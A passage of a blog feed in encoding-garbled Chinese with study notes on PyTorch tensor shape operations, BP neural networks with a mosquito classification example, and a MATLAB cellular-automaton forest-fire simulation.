é‡å½¢çŠ¶æ“ä½œ"></a>å¼ é‡å½¢çŠ¶æ“ä½œ</h2><p>reshape å‡½æ•°å¯ä»¥åœ¨ä¿è¯å¼ é‡æ•°æ®ä¸å˜çš„å‰æä¸‹æ”¹å˜æ•°æ®çš„ç»´åº¦ï¼Œå°†å…¶è½¬æ¢æˆæŒ‡å®šçš„å½¢çŠ¶ï¼Œå‰ææ˜¯æ•°æ®ä¸ªæ•°ä¸å˜ã€‚</p><p>ranspose å‡½æ•°å¯ä»¥å®ç°äº¤æ¢å¼ é‡å½¢çŠ¶çš„æŒ‡å®šç»´åº¦, ä¾‹å¦‚: ä¸€ä¸ªå¼ é‡çš„å½¢çŠ¶ä¸º (2, 3, 4) å¯ä»¥é€šè¿‡ transpose å‡½æ•°æŠŠ 3 å’Œ 4 è¿›è¡Œäº¤æ¢, å°†å¼ é‡çš„å½¢çŠ¶å˜ä¸º (2, 4, 3)</p><p>squeeze å‡½æ•°ç”¨åˆ é™¤ shape ä¸º 1 çš„ç»´åº¦ï¼Œunsqueeze åœ¨æ¯ä¸ªç»´åº¦æ·»åŠ  1, ä»¥å¢åŠ æ•°æ®çš„å½¢çŠ¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">data = torch.tensor(np.random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data shape:&#x27;</span>, data.size())<br><br><span class="hljs-comment"># 1. å»æ‰å€¼ä¸º1çš„ç»´åº¦</span><br>new_data = data.squeeze()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;new_data shape:&#x27;</span>, new_data.size())  <span class="hljs-comment"># torch.Size([3, 5])</span><br><br><span class="hljs-comment"># 2. å»æ‰æŒ‡å®šä½ç½®ä¸º1çš„ç»´åº¦ï¼Œæ³¨æ„: å¦‚æœæŒ‡å®šä½ç½®ä¸æ˜¯1åˆ™ä¸åˆ é™¤</span><br>new_data = data.squeeze(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;new_data shape:&#x27;</span>, new_data.size())  <span class="hljs-comment"># torch.Size([3, 5])</span><br><br><span class="hljs-comment"># 3. åœ¨2ç»´åº¦å¢åŠ ä¸€ä¸ªç»´åº¦</span><br>new_data = data.unsqueeze(-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;new_data shape:&#x27;</span>, new_data.size())  <span class="hljs-comment"># torch.Size([3, 1, 5, 1])</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data shape: torch.Size([<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>])<br>new_data shape: torch.Size([<span class="hljs-number">3</span>, <span class="hljs-number">5</span>])<br>new_data shape: torch.Size([<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>])<br>new_data shape: torch.Size([<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BPç¥ç»ç½‘ç»œ</title>
    <link href="/2024/01/31/BP/"/>
    <url>/2024/01/31/BP/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¥ç»ç½‘ç»œçš„æ„æˆ"><a href="#ç¥ç»ç½‘ç»œçš„æ„æˆ" class="headerlink" title="ç¥ç»ç½‘ç»œçš„æ„æˆ"></a>ç¥ç»ç½‘ç»œçš„æ„æˆ</h1><p><img src="/Pictures/MCM/BP/plot01.png" alt="img"></p><p>äººå·¥ç¥ç»ç½‘ç»œï¼ˆANNï¼‰å…·æœ‰è‡ªå­¦ä¹ ã€è‡ªç»„ç»‡ã€è¾ƒå¥½çš„å®¹é”™æ€§å’Œä¼˜è‰¯çš„éçº¿æ€§é€¼è¿‘èƒ½åŠ›ã€‚</p><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œ80%~90%çš„äººå·¥ç¥ç»ç½‘ç»œæ¨¡å‹æ˜¯é‡‡ç”¨è¯¯å·®åä¼ ç®—æ³•æˆ–å…¶å˜åŒ–å½¢å¼çš„ç½‘ç»œæ¨¡å‹ã€‚</p><p>ANNé€šè¿‡æ•°å­¦è¿‘ä¼¼æ˜ å°„ï¼ˆå‡½æ•°é€¼è¿‘ï¼‰å®Œæˆæ‹Ÿåˆâ€”â€”&gt;é¢„æµ‹ï¼Œåˆ†ç±»â€”â€”&gt;èšç±»åˆ†æçš„å·¥ä½œ</p><p>ä»æ¨¡å‹ä¸Šè¿›è¡Œæ‹†åˆ†ï¼Œç¥ç»ç½‘ç»œåŒ…æ‹¬ï¼š</p><ol><li>ç¥ç»å…ƒæ¨¡å‹</li><li>æ¿€æ´»å‡½æ•°</li><li>ç½‘ç»œç»“æ„</li><li>å·¥ä½œçŠ¶æ€</li><li>å­¦ä¹ æ–¹å¼</li></ol><h2 id="å»ºç«‹å’Œåº”ç”¨ç¥ç»ç½‘ç»œçš„æ­¥éª¤"><a href="#å»ºç«‹å’Œåº”ç”¨ç¥ç»ç½‘ç»œçš„æ­¥éª¤" class="headerlink" title="å»ºç«‹å’Œåº”ç”¨ç¥ç»ç½‘ç»œçš„æ­¥éª¤"></a>å»ºç«‹å’Œåº”ç”¨ç¥ç»ç½‘ç»œçš„æ­¥éª¤</h2><ol><li><p>ç½‘ç»œç»“æ„çš„ç¡®å®š</p><blockquote><p>åŒ…å«ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„å’Œæ¯ä¸ªç¥ç»å…ƒç›¸åº”å‡½æ•°çš„é€‰å–ã€‚</p></blockquote></li><li><p>æƒå€¼å’Œé˜ˆå€¼çš„ç¡®å®š</p><blockquote><p>é€šè¿‡å­¦ä¹ å¾—åˆ°ï¼Œåˆ©ç”¨å·²çŸ¥çš„ä¸€ç»„æ­£ç¡®çš„è¾“å…¥è¾“å‡ºï¼Œè°ƒæ•´æƒå€¼å’Œé˜ˆå€¼ä½¿å¾—ç½‘ç»œè¾“å‡ºä¸ç†æƒ³è¾“å‡ºåå·®å°½é‡å°ã€‚</p></blockquote></li><li><p>å·¥ä½œé˜¶æ®µ</p><blockquote><p>ç”¨å¸¦æœ‰ç¡®å®šæƒé‡å€¼å’Œé˜ˆå€¼çš„ç¥ç»ç½‘ç»œè§£å†³é—®é¢˜çš„è¿‡ç¨‹ï¼Œä¹Ÿå«æ¨¡æ‹Ÿã€‚</p></blockquote></li></ol><h2 id="äººå·¥ç¥ç»å…ƒçš„æ¨¡å‹"><a href="#äººå·¥ç¥ç»å…ƒçš„æ¨¡å‹" class="headerlink" title="äººå·¥ç¥ç»å…ƒçš„æ¨¡å‹"></a>äººå·¥ç¥ç»å…ƒçš„æ¨¡å‹</h2><p><img src="/Pictures/MCM/BP/plot02.png" alt="img"></p><ul><li>ç¥ç»å…ƒè¾“å…¥ä¸è¾“å‡ºçš„å…³ç³»ä¸ºï¼š</li></ul><p>$$<br>net_{i}&#x3D;\sum_{j&#x3D;1}^{n}w_{ij}x_{j}-\theta &#x3D;\sum_{j&#x3D;0}^{n}w_{ij}x_{j} \\<br>y_{i}&#x3D;f(net_{i})<br>$$</p><ul><li>è‹¥ç”¨Xè¡¨ç¤ºè¾“å…¥å‘é‡ï¼ŒWè¡¨ç¤ºæƒé‡å‘é‡</li></ul><p>$$net_{i}&#x3D;XW,y_{i}&#x3D;f(XW)$$</p><ul><li>å¸¸ç”¨æ¿€æ´»å‡½æ•°</li></ul><ol><li><p>çº¿æ€§å‡½æ•°<br>$$f(x)&#x3D;kx+c$$</p></li><li><p>Så‡½æ•°<br>$$f(x)&#x3D;\frac{1}{1+e^{-ax}}$$</p></li><li><p>é˜ˆå€¼å‡½æ•°<br>$$f(x)&#x3D;\begin{cases} T,x&gt;c\\ kx,-c\le x\le c \\ -T,x&lt;-c \end{cases}$$</p></li><li><p>åŒæSå‡½æ•°<br>$$f(x)&#x3D;\frac{2}{1+e^{-ax}}-1$$</p></li></ol><h2 id="ç½‘ç»œæ¨¡å‹"><a href="#ç½‘ç»œæ¨¡å‹" class="headerlink" title="ç½‘ç»œæ¨¡å‹"></a>ç½‘ç»œæ¨¡å‹</h2><ol><li><p>å‰é¦ˆç¥ç»ç½‘ç»œ</p><blockquote><p>åªåœ¨è®­ç»ƒè¿‡ç¨‹ä¼šæœ‰åé¦ˆä¿¡å·ï¼Œè€Œåœ¨åˆ†ç±»è¿‡ç¨‹ä¸­æ•°æ®åªèƒ½å‘å‰ä¼ é€ï¼Œç›´åˆ°åˆ°è¾¾è¾“å‡ºå±‚</p></blockquote></li><li><p>åé¦ˆç¥ç»ç½‘ç»œ</p><blockquote><p>ä»è¾“å‡ºåˆ°è¾“å…¥è¿‡ç¨‹å…·æœ‰åé¦ˆé“¾æ¥çš„ç¥ç»ç½‘ç»œ</p></blockquote></li><li><p>è‡ªç»„ç»‡ç¥ç»ç½‘ç»œ</p><blockquote><p>é€šè¿‡è‡ªåŠ¨å¯»æ‰¾æ ·æœ¬ä¸­çš„å†…åœ¨è§„å¾‹å’Œæœ¬è´¨å±æ€§ï¼Œè‡ªç»„ç»‡ã€è‡ªé€‚åº”åœ°æ”¹å˜ç½‘ç»œå‚æ•°ä¸ç»“æ„ã€‚</p></blockquote></li></ol><p><img src="/Pictures/MCM/BP/plot03.png" alt="img"></p><h2 id="å­¦ä¹ æ–¹å¼"><a href="#å­¦ä¹ æ–¹å¼" class="headerlink" title="å­¦ä¹ æ–¹å¼"></a>å­¦ä¹ æ–¹å¼</h2><ol><li>æœ‰ç›‘ç£å­¦ä¹ </li></ol><p>å°†ä¸€ç»„è®­ç»ƒé›†é€å…¥ç½‘ç»œï¼Œæ ¹æ®ç½‘ç»œçš„å®é™…è¾“å‡ºä¸æœŸæœ›è¾“å‡ºä¹‹é—´çš„å·®åˆ«æ¥è°ƒæ•´è¿æ¥æƒ</p><ol start="2"><li>æ— ç›‘ç£å­¦ä¹ </li></ol><p>æŠ½å–æ ·æœ¬ä¸­è•´å«çš„ç»Ÿè®¡ç‰¹å¾ï¼Œå¹¶ä»¥ç¥ç»å…ƒä¹‹é—´çš„è¿æ¥æƒçš„æ–¹å¼å­˜äºç½‘ç»œä¸­ã€‚</p><p><strong>é‡‡ç”¨BPå­¦ä¹ ç®—æ³•çš„å‰é¦ˆç¥ç»ç½‘ç»œç§°ä¸ºBPç¥ç»ç½‘ç»œ</strong></p><h1 id="BPç®—æ³•"><a href="#BPç®—æ³•" class="headerlink" title="BPç®—æ³•"></a>BPç®—æ³•</h1><h2 id="BP-Back-Propagation-ç®—æ³•çš„åŸºæœ¬åŸç†"><a href="#BP-Back-Propagation-ç®—æ³•çš„åŸºæœ¬åŸç†" class="headerlink" title="BP(Back Propagation)ç®—æ³•çš„åŸºæœ¬åŸç†"></a>BP(Back Propagation)ç®—æ³•çš„åŸºæœ¬åŸç†</h2><p>åˆ©ç”¨è¾“å‡ºåçš„è¯¯å·®æ¥ä¼°è®¡è¾“å‡ºå±‚çš„ç›´æ¥å‰å¯¼å±‚çš„è¯¯å·®ï¼Œå†ç”¨è¿™ä¸ªè¯¯å·®ä¼°è®¡æ›´å‰ä¸€å±‚çš„è¯¯å·®ï¼Œè·å¾—å„å±‚çš„è¯¯å·®ä¼°è®¡ã€‚</p><p>æ€»ç»“æ¥è¯´ï¼Œå°±æ˜¯<strong>ä¿¡å·çš„æ­£å‘ä¼ æ’­&amp;è¯¯å·®çš„åå‘ä¼ æ’­</strong></p><h1 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h1><p>1981å¹´ç”Ÿç‰©å­¦å®¶å‘ç°äº†ä¸¤ç±»èšŠå­ï¼Œä»–ä»¬æµ‹é‡çš„æ•°æ®å¦‚ä¸‹</p><table><thead><tr><th>ç¿¼é•¿</th><th>è§¦è§’é•¿</th><th>ç±»åˆ«</th></tr></thead><tbody><tr><td>1.78</td><td>1.14</td><td>Apf</td></tr><tr><td>1.96</td><td>1.18</td><td>Apf</td></tr><tr><td>1.86</td><td>1.20</td><td>Apf</td></tr><tr><td>1.72</td><td>1.24</td><td>Af</td></tr><tr><td>2.00</td><td>1.26</td><td>Apf</td></tr><tr><td>2.00</td><td>1.28</td><td>Apf</td></tr><tr><td>1.96</td><td>1.30</td><td>Apf</td></tr><tr><td>1.74</td><td>1.36</td><td>Af</td></tr><tr><td>1.64</td><td>1.38</td><td>Af</td></tr><tr><td>1.82</td><td>1.38</td><td>Af</td></tr><tr><td>1.90</td><td>1.38</td><td>Af</td></tr><tr><td>1.70</td><td>1.40</td><td>Af</td></tr><tr><td>1.82</td><td>1.48</td><td>Af</td></tr><tr><td>1.82</td><td>1.54</td><td>Af</td></tr><tr><td>2.08</td><td>1.56</td><td>Af</td></tr></tbody></table><p>æ„å»ºæ¨¡å‹åŒºåˆ†ä¸¤ç§èšŠå­ã€‚</p><h2 id="ä»¥è§¦è§’å’Œç¿¼é•¿ä¸ºåæ ‡è½´ä½œå›¾"><a href="#ä»¥è§¦è§’å’Œç¿¼é•¿ä¸ºåæ ‡è½´ä½œå›¾" class="headerlink" title="ä»¥è§¦è§’å’Œç¿¼é•¿ä¸ºåæ ‡è½´ä½œå›¾"></a>ä»¥è§¦è§’å’Œç¿¼é•¿ä¸ºåæ ‡è½´ä½œå›¾</h2><p>xä¸ºè§¦è§’é•¿ï¼Œyä¸ºç¿¼é•¿</p><p><img src="/Pictures/MCM/BP/plot04.png" alt="img"></p><p><strong>æ€è·¯ä¸€ï¼šåšä¸€æ¡ç›´çº¿å°†ä¸¤ç±»èšŠå­åŒºåˆ†å¼€</strong></p><p>$$y&#x3D;1.47x-0.017$$</p><p>åˆ†ç±»è§„åˆ™ï¼šåœ¨ç›´çº¿ä¸€ä¾§çš„ä¾¿å½’ä¸ºé‚£ä¸€ç±»ã€‚</p><p><strong>æ€è·¯äºŒï¼šå°†é—®é¢˜çœ‹ä¸ºä¸€ä¸ªç³»ç»Ÿï¼Œæ„å»ºä¸€ä¸ªç¥ç»ç½‘ç»œè®­ç»ƒæ¨¡å‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.tree <span class="hljs-keyword">import</span> DecisionTreeClassifier<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br><span class="hljs-comment"># åˆ›å»ºæ•°æ®æ¡†</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;ç¿¼é•¿&#x27;</span>: [<span class="hljs-number">1.78</span>, <span class="hljs-number">1.96</span>, <span class="hljs-number">1.86</span>, <span class="hljs-number">1.72</span>, <span class="hljs-number">2.00</span>, <span class="hljs-number">2.00</span>, <span class="hljs-number">1.96</span>, <span class="hljs-number">1.74</span>, <span class="hljs-number">1.64</span>, <span class="hljs-number">1.82</span>, <span class="hljs-number">1.90</span>, <span class="hljs-number">1.70</span>, <span class="hljs-number">1.82</span>, <span class="hljs-number">1.82</span>, <span class="hljs-number">2.08</span>],<br>    <span class="hljs-string">&#x27;è§¦è§’é•¿&#x27;</span>: [<span class="hljs-number">1.14</span>, <span class="hljs-number">1.18</span>, <span class="hljs-number">1.20</span>, <span class="hljs-number">1.24</span>, <span class="hljs-number">1.26</span>, <span class="hljs-number">1.28</span>, <span class="hljs-number">1.30</span>, <span class="hljs-number">1.36</span>, <span class="hljs-number">1.38</span>, <span class="hljs-number">1.38</span>, <span class="hljs-number">1.38</span>, <span class="hljs-number">1.40</span>, <span class="hljs-number">1.48</span>, <span class="hljs-number">1.54</span>, <span class="hljs-number">1.56</span>],<br>    <span class="hljs-string">&#x27;ç±»åˆ«&#x27;</span>: [<span class="hljs-string">&#x27;Apf&#x27;</span>, <span class="hljs-string">&#x27;Apf&#x27;</span>, <span class="hljs-string">&#x27;Apf&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Apf&#x27;</span>, <span class="hljs-string">&#x27;Apf&#x27;</span>, <span class="hljs-string">&#x27;Apf&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>, <span class="hljs-string">&#x27;Af&#x27;</span>]<br>&#125;<br>df = pd.DataFrame(data)<br><br><span class="hljs-comment"># å°†ç±»åˆ«è½¬æ¢ä¸ºæ•°å€¼ç¼–ç </span><br>df[<span class="hljs-string">&#x27;ç±»åˆ«&#x27;</span>] = df[<span class="hljs-string">&#x27;ç±»åˆ«&#x27;</span>].<span class="hljs-built_in">map</span>(&#123;<span class="hljs-string">&#x27;Apf&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Af&#x27;</span>: <span class="hljs-number">1</span>&#125;)<br><br><span class="hljs-comment"># å‡†å¤‡è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span><br>X = df[[<span class="hljs-string">&#x27;ç¿¼é•¿&#x27;</span>, <span class="hljs-string">&#x27;è§¦è§’é•¿&#x27;</span>]]<br>y = df[<span class="hljs-string">&#x27;ç±»åˆ«&#x27;</span>]<br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># åˆ›å»ºå¹¶è®­ç»ƒå†³ç­–æ ‘æ¨¡å‹</span><br>clf = DecisionTreeClassifier(random_state=<span class="hljs-number">42</span>)<br>clf.fit(X_train, y_train)<br><br><span class="hljs-comment"># åœ¨æµ‹è¯•é›†ä¸Šè¿›è¡Œé¢„æµ‹</span><br>y_pred = clf.predict(X_test)<br><br><span class="hljs-comment"># è®¡ç®—å‡†ç¡®ç‡</span><br>accuracy = accuracy_score(y_test, y_pred)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å‡†ç¡®ç‡ï¼š&quot;</span>, accuracy)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>BPç¥ç»ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…ƒèƒè‡ªåŠ¨æœº</title>
    <link href="/2024/01/31/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
    <url>/2024/01/31/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="å…ƒèƒè‡ªåŠ¨æœºçš„æ„æˆ"><a href="#å…ƒèƒè‡ªåŠ¨æœºçš„æ„æˆ" class="headerlink" title="å…ƒèƒè‡ªåŠ¨æœºçš„æ„æˆ"></a>å…ƒèƒè‡ªåŠ¨æœºçš„æ„æˆ</h1><p>å…ƒèƒè‡ªåŠ¨æœºæœ€åŸºæœ¬çš„ç»„æˆï¼š</p><ol><li>å…ƒèƒ</li><li>å…ƒèƒç©ºé—´</li><li>é‚»è¿‘å…ƒèƒ</li><li>è§„åˆ™</li></ol><p>ç®€å•æ¥è¯´ï¼Œå…ƒèƒè‡ªåŠ¨æœºå¯ä»¥è§†ä¸ºç”±ä¸€ä¸ªå…ƒèƒç©ºé—´å’Œå®šä¹‰äºè¯¥ç©ºé—´çš„å˜æ¢å‡½æ•°ç»„æˆï¼Œæ¯ä¸€ä¸ªå…ƒèƒä¾ç…§è§„åˆ™å‘ç”ŸçŠ¶æ€çš„å˜åŒ–ï¼Œå¹¶å¯¹é‚»è¿‘å…ƒèƒäº§ç”Ÿå½±å“ã€‚</p><p>åœ¨è®¡ç®—æœºç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨å››è¾¹å½¢ç½‘æ ¼è¿›è¡Œè¡¨è¾¾æ˜¾ç¤ºã€‚</p><h1 id="ä¾‹é¢˜ï¼šå…ƒèƒè‡ªåŠ¨æœºæ¨¡æ‹Ÿæ£®æ—ç«ç¾"><a href="#ä¾‹é¢˜ï¼šå…ƒèƒè‡ªåŠ¨æœºæ¨¡æ‹Ÿæ£®æ—ç«ç¾" class="headerlink" title="ä¾‹é¢˜ï¼šå…ƒèƒè‡ªåŠ¨æœºæ¨¡æ‹Ÿæ£®æ—ç«ç¾"></a>ä¾‹é¢˜ï¼šå…ƒèƒè‡ªåŠ¨æœºæ¨¡æ‹Ÿæ£®æ—ç«ç¾</h1><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæ£®æ—ç«ç¾ä¸€ç›´æ˜¯å¾ˆå¤šæ£®æ—è¦†ç›–ç‡æ¯”è¾ƒé«˜çš„å›½å®¶çš„å¿ƒå¤´å¤§æ‚£ã€‚</p><p>å› ä¸ºäººç±»æ´»åŠ¨çš„ä¸æ–­å¢åŠ ï¼Œæ£®æ—ç«ç¾çš„å‡ ç‡ä¹Ÿé€æ¸å¢åŠ ï¼Œä»ä¹‹å‰çš„è‡ªç„¶ç«ï¼ˆé—ªç”µã€é«˜æ¸©ï¼‰åˆ°ç°åœ¨çš„äººä¸ºç«ï¼Œéƒ½æ˜¯æ£®æ—ç«ç¾çš„ç½ªé­ç¥¸é¦–ã€‚</p><p>æ‰€ä»¥æ£®æ—å¤§ç«çš„é˜²æ²»ä¸€ç›´æ˜¯è¦ç»•åœ¨å„ä¸ªå›½å®¶å…ƒé¦–å¤´é¡¶çš„é—®é¢˜ã€‚</p><p>è€Œä¸‹é¢è¿™ä¸ªä¾‹é¢˜å°±æ˜¯æ¥ç®€å•æè¿°æ£®æ—ç«ç¾çš„å½¢æˆå’Œå‘å±•ã€‚</p><h2 id="åŸºæœ¬å‡è®¾å’Œå‡è®¾è§£æ"><a href="#åŸºæœ¬å‡è®¾å’Œå‡è®¾è§£æ" class="headerlink" title="åŸºæœ¬å‡è®¾å’Œå‡è®¾è§£æ"></a>åŸºæœ¬å‡è®¾å’Œå‡è®¾è§£æ</h2><ul><li>æ­£åœ¨ç‡ƒçƒ§çš„æ ‘å˜æˆç©ºæ ¼ä½</li><li>å¦‚æœç»¿æ ‘æ ¼ä½çš„æœ€è¿‘é‚»å±…ä¸­æœ‰ä¸€ä¸ªæ ‘åœ¨ç‡ƒçƒ§ï¼Œåˆ™å®ƒå˜æˆæ­£åœ¨ç‡ƒçƒ§çš„æ ‘</li><li>åœ¨ç©ºæ ¼ä½ï¼Œæ ‘ä»¥æ¦‚ç‡pç”Ÿé•¿</li><li>åœ¨æœ€è¿‘çš„é‚»å±…ä¸­æ²¡æœ‰æ­£åœ¨ç‡ƒçƒ§çš„æ ‘çš„æƒ…å†µä¸‹æ ‘åœ¨æ¯ä¸€æ—¶æ­¥ä»¥æ¦‚ç‡f(é—ªç”µ)å˜ä¸ºæ­£åœ¨ç‡ƒçƒ§çš„æ ‘</li></ul><p><img src="/Pictures/MCM/Cell/plot01.png" alt="img"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">close all;<br>clc;<br>clear;<span class="hljs-comment">%æ¸…å±å‘½ä»¤</span><br><span class="hljs-built_in">figure</span>;<span class="hljs-comment">%åˆ©ç”¨å½“å‰å±æ€§åˆ›å»ºçª—æ ¼</span><br>p=<span class="hljs-number">0.3</span>;<span class="hljs-comment">% æ¦‚ç‡pï¼Œç”¨æ¥è¡¨ç¤ºæ ‘ç”Ÿé•¿çš„é€Ÿåº¦</span><br>f=<span class="hljs-number">6e-5</span>;<span class="hljs-comment">% æ¦‚ç‡f,ç”¨æ¥è¡¨ç¤ºé—ªç”µå‡»ä¸­çš„æ¦‚ç‡</span><br>axes;<span class="hljs-comment">%å»ºç«‹åæ ‡è½´</span><br><span class="hljs-built_in">rand</span>(<span class="hljs-string">&#x27;state&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-comment">%è¿™ä¸ªå‘½ä»¤åº”è¯¥æ˜¯å›åˆ°æœ€å¼€å§‹çš„ç§å­ï¼Œ</span><br><span class="hljs-comment">%å¦åˆ™æ£®æ—çš„çŠ¶æ€åœ¨ä½ ç¬¬äºŒæ¬¡è¿è¡Œçš„æ—¶å€™æ˜¯æ¥ç€ä¸Šä¸€æ¬¡è¿è¡Œçš„ç»“æœ</span><br><span class="hljs-comment">%ä¸æ˜¯ä¸€ä¸ªæ–°çš„çŠ¶æ€</span><br>set(gcf,<span class="hljs-string">&#x27;DoubleBuffer&#x27;</span>,<span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-comment">%è®¾ç½®çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢åœ¨ä¸æ–­å¾ªç¯ç”»åŠ¨ç”»çš„æ—¶å€™ä¼šäº§ç”Ÿé—ªçƒçš„ç°è±¡</span><br>S=<span class="hljs-built_in">round</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">300</span>)*<span class="hljs-number">2</span>);<br><span class="hljs-comment">%å°† X çš„æ¯ä¸ªå…ƒç´ å››èˆäº”å…¥ä¸ºæœ€è¿‘çš„æ•´æ•°,æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå››èˆäº”å…¥çš„å‡½æ•°</span><br><span class="hljs-comment">%åˆå§‹åŒ–æ£®æ—</span><br>Sk=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">302</span>);<span class="hljs-comment">%åˆå§‹åŒ–SkçŸ©é˜µ</span><br>Sk(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)=S;<span class="hljs-comment">%%åŠ è¾¹å¼€å§‹çš„æ£®æ—åˆå€¼ï¼Œæ£®æ—çš„è¾¹ç•Œä¸ºä¸€åˆ—æˆ–è€…ä¸€è¡Œ</span><br><span 